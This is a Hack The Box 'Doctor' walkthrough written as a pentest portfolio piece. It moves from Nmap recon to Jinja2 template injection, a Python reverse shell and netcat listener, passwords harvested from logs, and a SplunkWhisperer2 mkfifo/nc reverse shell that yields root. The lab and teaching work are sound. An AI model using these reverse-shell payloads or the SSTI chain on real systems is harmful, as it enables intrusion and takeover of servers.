![[alAKF7KqE5nj9L3O-generated_image.jpg]]
---

# **Hack The Box: Doctor**

_A Thorough Web App Security Walkthrough_

---

## **🚀 Why Web App Security?**

Before diving in, let’s address _why_ we’re here:

- **Employers**: This walkthrough demonstrates not only my practical hacking skills but also my understanding of **web application security** fundamentals. You’ll see me apply concepts from **OWASP Top 10** vulnerabilities and real-world methodology.
- **Aspiring Pentesters**: If you’re building your skillset, let this serve as a **teachable moment**. Each step, I’ll show how to think like a **web app hacker** while using **TCM Security**’s approach.
- **TCM Security Influences (PJPT, PWPA, PWPP)**: The training from these courses helped me develop the habit of enumerating systematically, always checking for **injection points**, **misconfigurations**, and potential **access control issues** all typical of the **OWASP Top 10**.

---

## **🛠️ Your Arsenal for HTB: Doctor**

First things first: let’s talk gear. This box is a web app, so here’s what I’m rolling with:

|🛠️ Tool|🔍 Purpose|
|---|---|
|**Nmap**|Port scanning & service enumeration (recon).|
|**Burp Suite**|Intercepting & modifying web traffic (a must for **OWASP Top 10** testing).|
|**nano / mousepad**|Quick edits on payloads and scripts.|
|**XSS Payloads**|Testing for **Cross-Site Scripting** (OWASP A07:2021 – Identification and Exploitation).|
|**SQL Injection Payloads**|Looking for **SQLi** (OWASP A03:2021 – Injection).|
|**SSTI Payloads**|Hunting **Server-Side Template Injection** vulnerabilities.|

> **TCM Security Shoutout**: In the **PJPT**, **PWPA**, and **PWPP**, I learned to treat each tool as part of an **offensive arsenal**, but also how to pivot and adapt in real time, just like a real **internal pentest** scenario.

---

## **Game Plan**

- **Grab initial recon** with Nmap.
- **Dive into the web application**:
    - Check for classic OWASP vulnerabilities (SQLi, XSS).
    - Explore more advanced ones (Template Injection).
- **Find initial creds** → pivot to new users.
- **Leverage Splunk** misconfiguration for **root** access.

Let’s jump in.

---

## **1. Recon & Enumeration**

### **Nmap: Checking Our Doors**

I always start with **Nmap**, it’s my go-to scanning tool and it should be yours too it's a way to let us know where we are in the environment and what is around us. Lets run the following:

```bash
nmap -sV -sC -Pn -T4 10.10.10.209
```

|**Flag**|**Meaning**|
|---|---|
|`-sV`|Grab service versions (for example, Apache vs. Nginx).|
|`-sC`|Run default scripts (think of it like quick autopilot enumeration).|
|`-Pn`|Assume host is up (skip ping checks).|
|`-T4`|Faster scan without going full berserk (`T5`).|

**Why**: This approach helps identify **services** that might have known vulnerabilities (looking at you, **OWASP A09:2021 – Security Logging and Monitoring** if misconfigured, or potential **A05:2021 – Security Misconfiguration**).

**Scan Results**:  
![[nmap-results.png]]

- **Port 80 (HTTP)** open → likely a web interface. We know that visiting 10.10.10.209 should bring up a website.
- **Port 8089 (Splunk)** open with **ssl/http** → interesting, Splunk might be misconfigurable or hold sensitive info. Keep this in mind, write it down somewhere, always come back to our initial "foot in the door" enumeration.

> **TCM Security Habit**: We always note any unusual service—**Splunk** stands out because it can be exploited if left open or misconfigured, especially if credentials are leaked.

---

## **2. Web Exploration: Doctors.htb**

Visiting `http://10.10.10.209` gets us a “Health Solutions” page. From here on out, lets pretend that Health Solutions is our client asking us to do a Web App Pentest:

![[homepage.png]]

I notice:

- Phone, address (not relevant for the hack, but typical corporate details).
	- We aren't going to call the number for this box, maybe in a real pen test as part of our OSINT, and we aren't going to visit the address again maybe as part of the OSINT enumeration but we are web app pen testers, so there is only one thing that sticks out.
- An email: `info@doctors.htb`.

### **Add doctors.htb to /etc/hosts**

```bash
sudo mousepad /etc/hosts
```
or nano or vim whatever you prefer I know everyone has there preferences, just make sure you know how to exit out of the text editor :)

Add:

```
10.10.10.209 doctors.htb
```

## Why This Works

- The machine likely **expects** us to access it via `doctors.htb` rather than just the IP address.
- Some web applications behave **differently** depending on the hostname used, often due to **virtual hosting**.
- This could unlock **new content, new functionality, or even a hidden login page** that wasn’t visible when we visited the raw IP.
---

### **Navigating to doctors.htb**

![[login.png]]

We see a **login** screen. CSS might look broken at first, but no big deal. This hints we might be dealing with a quirky setup or partial content. Actually a quick update, I switched the VPN from EU to US in the HTB website and this made the CSS load way faster. So quick tip for everyone there.

**OWASP Angle**: This is typically where we check for **Injection** (SQLi), **Broken Authentication** (OWASP A01:2021), or any **XSS** in user inputs. Refer to the screenshot for this.

---

## **Endpoint: /login?next=%2F**

We see:

- **Login and Register** options
- **Remember Me** checkbox (potential session management vector—**OWASP A07**)
- **Forgot Password** (possible exploitation of **race conditions** or token tampering—**OWASP A02**)

### **Register a New User**

We’ll create an account to see the next stage:

![[register.png]]

> **Side Note**: _OWASP A05:2021 – Security Misconfiguration_ also suggests we check if the site enforces strong passwords, or if there’s a **Registration** endpoint vulnerable to weird payloads. I used the password test which is 4 characters, so we know there is literally no password complexity implemented here.

---

### **📌 Side Note: Web App Pentesting Considerations (Feel Free to Skip This Section)**

> This is **not part of the walkthrough**, so if you just want to follow the steps, feel free to skip this. But if you're looking to sharpen your web app pentesting mindset, this section is for you.

If this were a real-world web app penetration test, this page should immediately trigger a few thoughts:

- **Does the login form have SQL injection vulnerabilities?**
    
    - If we had usernames from reconnaissance, we could try **SQL injection for authentication bypass**.
    - Could there be a **second-order SQL injection** vulnerability somewhere deeper in the application?

- **Could this be vulnerable to stored XSS?**
    
    - Does it reflect user input somewhere on the page?
    - If we register, does our username or email get displayed anywhere else later?

- **Are there broken access controls?**
    
    - Can we access restricted areas by modifying the request?
    - What happens if we sign up and try visiting `/admin`?
- **What’s happening with session management?**
    
    - Does Burp Suite show that this page sets **cookies** when we log in?
    - If we check the "Remember Me" box, how does that affect the request and response?
    - Can we manipulate cookies to maintain access longer than intended?

- **What about race conditions on the "Forgot Password" feature?**
    
    - If we spam password reset requests, do we cause weird behavior?
    - Could an attacker potentially exploit this for account takeover?

Again, this is **extra knowledge for web app pentesters**, not a required step for solving the box. We’re about to **register a new user and see where it takes us**.

---

## **Landing in the Web App**

After registration, we see:

![[home-doctors.png]]

There’s a “New Message” feature at `/Home`. We should open **Burp Suite** to watch for cookies and session tokens (OWASP session mgmt best practices).

### **New Message**: Potential XSS, SQLi, or Template Injection

![[post-new.png]]

Here’s where a **web app** pentester would methodically test:

1. **XSS** → Insert `<script>` or HTML tags.
2. **SQLi** → Insert `' OR 1=1 --` type payloads.
3. **Template Injection** → Insert `{{7*7}}` or special polyglots.

Given my **TCM Security** training, I note the fastest tests: XSS or template injection. Let’s try a quick XSS:

```html
<h1>xss</h1><strong>xss</strong>
```

![[xss-payload.png]]

No reflection, **the site filters** our markup. Possibly **OWASP A03:2021 – Injection** is partially mitigated. Let’s pivot to **Template Injection**.

Lets check out the source code:

![[source-code-xss.png]]

We learn that it is being filtered out, so we either have to look for ways to bypass the filtering to get a food in the door for vertical movement, but lets move on to another attack for now and return to it later if we aren't successful.


---

## **Template Injection: The Polyglot Move**

Template injection happens when user input is processed by a template engine in an unsafe way. Instead of guessing which engine is in use, we’ll start with a **polyglot payload**, a string designed to trigger errors across multiple engines:

We use a polyglot payload:

```
${{<%[%'"}}%\.
```

If it triggers a 500 error, we have injection. 

Lets put it in the title and content sections, we don't know which one will process it so just to be on the safe side lets see what happens here:

![[post-polygot.png]]  
![[polyglot-reflected.png]]

It gets reflected back but sanitized, no 500 error. Similar to the XSS payload, lets investigate the source code to see what is happening, how is it being filtered? 

We find a clue in the source about an **/archive** endpoint:

![[source-code-archive.png]]

Visiting `/archive` yields an **error page**:

![[archive-error.png]]

**Yes!** This suggests partial template injection that might be triggered elsewhere. Alright things are about to pick up, we can now concentrate on SSTI instead of other attacks.

---

## **Confirming Jinja2 with {{7*7}}**

From **PayloadsAllTheThings**, we know:

- `{{7*7}}` → Jinja2
- `#{7*7}` → Thymeleaf

We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):

![[ssti-flowchart.png]]

We remove the old post causing a 500 error, then create a new one with `{{7*7}}` in the Title (and possibly the body). Next, we head to `/archive` to see if it evaluates.


This flowchart (from PayloadsAllTheThings) shows common SSTI test patterns. Let us do a quick step-by-step:

1. Delete the existing post that is causing the error.
2. Make a fresh post using `{{7*7}}` as the Title and Content.
3. Verify it shows up on the main feed.
4. Browse to `/archive` to trigger the rendering.

Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `/archive`.

- **BurpSuite /home endpoint**:  
    ![[burp-server-identity.png]]
    
- **BurpSuite /archive endpoint**:  
    ![[archive-49.png]]
    

Two big takeaways here:

1. The server at `/home` is clearly running **Python**.
2. Our `{{7*7}}` payload **evaluated** to **49**.

Referring back to the flowchart, that means we’re likely dealing with **Jinja2** (or possibly Twig). But since Twig is a **PHP** template engine and we see Python under the hood, we can safely bet on **Jinja2**.

This is good news! Now that we have a potential **SSTI** and a strong guess it’s **Jinja2**, we can try **another** quick test: `{{7*'7'}}`. That goofy-looking payload is just `7 multiplied by the character '7'`, which should come out to **7777777** if it works.

Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!

![[archive-jinja-payload.png]]

---

### **Breaking Down the Madness: Jinja2 RCE Payload Explained**

Alright, let’s take a step back because this payload looks like absolute chaos at first glance. If you're wondering, **"What the hell am I even looking at?"**, you're not alone. But don't worry, we’re gonna break it down **high-level style** so it actually makes sense.

#### **Step 1: What’s Happening Here?**

```python
{% for x in ().__class__.__base__.__subclasses__() %}
```

- This **loops through Python’s internal subclasses** to find something useful.
- Specifically, it's looking for a **class related to warnings**, because some warning-related classes expose **built-in functions** that can execute system commands.

#### **Step 2: Finding the Right Class**

```python
{% if "warning" in x.__name__ %}
```

- This **filters** for subclasses that contain `"warning"` in their name.
- The reason? There’s a sneaky way to **access Python’s built-in modules** through certain system warning classes.

#### **Step 3: Importing the OS Module & Running a Command**

```python
{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; ...
```

- **`__import__('os')`** dynamically imports the **OS module**, which lets us interact with the system.
- **`popen()`** is used to execute a command, in this case, a **Python one-liner reverse shell**.

#### **Step 4: What’s Actually Running?**

```python
python3 -c 'import socket,subprocess,os; 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("ip",4444)); 
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2); 
p=subprocess.call(["/bin/cat", "flag.txt"]);
```

Here’s what this is doing **step-by-step**:

1. **Creates a TCP socket** (`socket.socket(socket.AF_INET,socket.SOCK_STREAM)`)
2. **Connects to the attacker's machine** on `IP: 4444`
	1. Be sure to change the IP to your connected IP!
3. **Redirects stdin, stdout, and stderr** to the socket (`os.dup2()`)
4. **Runs a command** (`subprocess.call(["/bin/cat", "flag.txt"])`)

---

### **The Important Part We Care About**

The key part we need to **modify** is:

```python
subprocess.call(["/bin/cat", "flag.txt"]);
```

- This is just **reading** `flag.txt`.
- Instead, we want to **spawn an interactive shell**.

#### **Making It Interactive**

To actually **get a shell**, we replace `cat flag.txt` with `/bin/bash -i`, like so:

```python
subprocess.call(["/bin/bash", "-i"]);
```

This ensures that when we **connect back**, we get an **interactive shell** instead of just a single command execution.

---

### **Also, Don’t Forget the Port!**

```python
s.connect(("ip",4444))
```

- The number **4444** is the **port we need to listen on**.
- Before running the payload, make sure to **set up a listener** on your attacking machine:
    
    ```bash
    nc -lvnp 4444
    ```
    
    This will **catch** the incoming connection and drop us into a shell.

---

## Testing Our RCE Payload

1. Craft a new message post, placing the Jinja2 RCE payload in the Title or Content field.
2. Save the post, confirm it appears under `/home`.
3. Start a netcat listener on port 4444:
    

4. `nc -lvnp 4444`
    
2. Browse to `/archive` to make the server parse our post.

![[title-payload.png]]

We see the post was accepted. When we load `/archive`, it should attempt to run our Python one-liner. If the IP and port match your listener, you should catch a reverse shell:

![[jinja-payload-failed.png]]

Even though this screenshot says "failed," if your payload is correct, it may still reach out to your listener. If you only see a quick response like the contents of `flag.txt`, that means you forgot to switch `cat flag.txt` to `/bin/bash -i`. Once you make that change and reload `/archive`, you should see:

![[reverse-shell-success.png]]

Running `pwd` or `id` confirms we have a shell.

---

### **💻 Leveling Up: Making Our Shell Interactive**

Alright, we got our initial foothold, but before we start poking around, let’s fix something that might cause a headache later.

Since this server is running Python, we can use a quick trick to **upgrade our shell** into something more interactive. You technically don’t **need** to do this to complete the box, but trust me, it’ll save you some frustration. Without an interactive shell:

- You won’t see password prompts when running commands like `su` (yeah, I learned that the hard way)
- You can’t use shortcuts like `CTRL+C` or `CTRL+Z` properly
- Some programs just won’t work right

To avoid these issues, run this as soon as you get a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.
---

## Checking Logs for Credentials

Now that we have a shell, we look around for anything that can help us pivot. A great starting point is searching log files for passwords, since administrators often slip up:

`grep -R -o "password" /var/log`

- `grep` searches files for the string "password."
- `-R` tells grep to search recursively in subdirectories.
- `-o` prints the matching parts only.

![[enum-user-creds.png]]

First thing that jumps out is all the **permission denied** errors. No surprise there—we don’t have access to everything yet. But look a little closer and you’ll see something interesting.

There’s a **failed login attempt** for an invalid user named `shaun`. Right below that, we see the string **Guitar123**, but there’s no `@` symbol or domain name next to it. Looks like someone fat-fingered their password into the email field.

So, we might have just found creds:

```
shaun:Guitar123
```


---

### **Switching to Shaun’s Account**

Let’s test the creds and see if we can log in as `shaun`. Run:

```bash
su shaun
```

If the password works, you should see this:

![[login-shaun.png]]

Nice. We’re in. Since we need a **user flag**, it’s safe to assume it’s somewhere in Shaun’s home directory. Let’s start looking around.

### **Finding the User Flag**

I went up a directory and saw two interesting folders:

- **web** (looks like it has a blog and a script named `blog.sh`)
- **shaun** (which, based on experience, probably has our flag)

I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’s grab the flag:

```bash
cat user.txt
```

![[userflag.png]]

There it is. The **user flag** is ours. Now we can head back to HTB, submit it, and move on to the real challenge, getting root. Feels cool to say it doesn't it? On some Mr. Robot type stuff.

---

## Revisiting Splunk for Root Escalation

During our initial Nmap scan, we noticed Splunk running on port 8089. Splunk has a management interface that might allow command execution if we have valid credentials. First, verify Splunk is running:

`ps aux | grep splunk`

- `ps aux` displays all running processes.
- `grep splunk` filters the list to show only lines containing "splunk."

![[grep-splunk-proc.png]]

Splunk is indeed active. 

A quick Google search led me to this page:

[SplunkWhisperer2 - Splunk Universal Forwarder Hijacking](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)

And the GitHub repo for the tool:

[SplunkWhisperer2 GitHub](https://github.com/cnotin/SplunkWhisperer2)

If you’ve never done a box like this before, don’t be surprised if you need to download extra tools that weren’t in your original game plan. That’s normal in both CTFs and real-world pentesting. The more tools you get comfortable with, the better.

One issue I ran into—HTB’s VPN connection was **blocking** my download from GitHub. If you have the same problem, just **disconnect from the VPN, download the tool, and reconnect**.

---

### Exploiting Splunk Universal Forwarder

We attempt a simple command:

`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id`

![[pySplunkError.png]]

It fails with an authentication error. No problem, we have shaun:Guitar123. Let us try that with a reverse shell. Before running the exploit, start a listener on port 1994:

`nc -lvp 1994`

Now run:

`python3 PySplunkWhisperer2_remote.py \   --host 10.10.10.209 \   --username shaun \   --password Guitar123 \   --lhost 10.10.14.38 \   --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'`

- `--host 10.10.10.209` is the target.
- `--username shaun` and `--password Guitar123` are the creds we found in the logs.
- `--lhost 10.10.14.38` is our attacking IP.
- `--payload` is a quick trick using mkfifo to spawn a shell that connects back to us.

We run it, and see:

![[pysplunkRCE.png]]

It connects back. Now, check the shell on your netcat listener:

![[root.png]]

We can see a root environment. Use `ls` or `pwd` to verify, then:

`cat /root/root.txt`

We grab the root flag. Mission accomplished.

---

## Final Reflections

We combined:

1. **SSTI** in the web app to get the first foothold.
2. **Credential leaks** in log files to pivot to a new user.
3. **Splunk** misconfiguration to escalate to root.

This aligns with common OWASP Top 10 issues (Injection, Security Misconfiguration, and so on). If this were a real-world pentest, we would document each step, show proof of concepts, and provide remediation advice.

---

**Done**. We have both the user and root flags. Remember to keep practicing the methodology: always try multiple angles (XSS, SSTI, SQLi), check logs, watch for reused or leaked credentials, and look for services like Splunk that might be misconfigured. Happy hacking.
---

### **Shout-Out to TCM Security (PJPT, PWPA, PWPP)**

Throughout this box, the methods and mindsets come straight from these courses. **PJPT** (Practical Junior Pentester) taught me the fundamentals of scanning and pivoting. **PWPA** (Practical Web Pentesting Analyst) honed my approach on OWASP vulnerabilities. **PWPP** (Practical Web Payload Pentesting) pushed me to develop advanced exploit payloads—like the ones we used in Jinja2 injection.

**Employers**: This synergy of hands-on labs plus methodical training is exactly what I bring to a real-world security team.

---

## **Final Thoughts:**

- We combined **web enumeration** with **OWASP Top 10** knowledge to pwn this box.
- **SSTI** gave initial access; pivoting on **logged credentials** (a real-life, messy scenario) got us user.
- Finally, misconfiguration in **Splunk** handed us **root**.

This path showcases not only technical prowess but also a deeper understanding of **web app security** best practices, from **XSS filtering** to **Template Injection** to **Session/Logging misconfigurations**. If you read this as a potential employer or a budding pentester, hope you found it valuable—and a glimpse into my **TCM Security**-inspired methodology.

**We are done here**. Two flags secured, knowledge gained, and a whole lot of fun in the process. See you on the next box.